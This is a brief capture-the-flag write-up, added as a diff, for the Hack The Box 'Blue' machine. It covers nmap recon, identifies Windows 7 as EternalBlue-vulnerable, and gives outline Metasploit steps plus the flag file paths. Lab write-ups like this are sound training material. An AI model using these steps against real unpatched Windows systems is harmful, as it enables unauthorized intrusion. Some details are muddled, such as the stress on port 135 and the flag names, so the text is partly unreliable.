@@ -1,0 +1,50 @@
+Explanation:
+
+Blue is an easy rated hack the box Machine
+
+Enumeration:
+
+Started with regular recon using the following commands 
+
+nmap -T4 -A -v 10.10.10.40  which lead to the following output:
+
+Discovered open port 445/tcp on 10.10.10.40
+Discovered open port 135/tcp on 10.10.10.40
+Discovered open port 139/tcp on 10.10.10.40
+Discovered open port 49153/tcp on 10.10.10.40
+Discovered open port 49157/tcp on 10.10.10.40
+Discovered open port 49155/tcp on 10.10.10.40
+Discovered open port 49156/tcp on 10.10.10.40
+Discovered open port 49154/tcp on 10.10.10.40
+Discovered open port 49152/tcp on 10.10.10.40
+
+Port 135 being the most exciting after getting the rest of the NMAP results back
+
+we see the following services are running on the port: 
+clock-skew: mean: 5m54s, deviation: 2s, median: 5m53s
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-02-13T20:13:46+00:00
+
+
+Windows 7 is known to be vulnerable to Eternal blue, hence the name of the box "Blue"
+
+
+FOOTHOLD/Exploit
+
+Open metasploit with the following commands : msfconsole
+
+search eternalblue
+
+Set RHOST <BOX IP>
+
+Set LHOST <Tun0>
+
+run
+
+
+Flags located in C:\\Users\administrator\desktop\flag.txt && C:\\Users\haris\desktop\root.txt
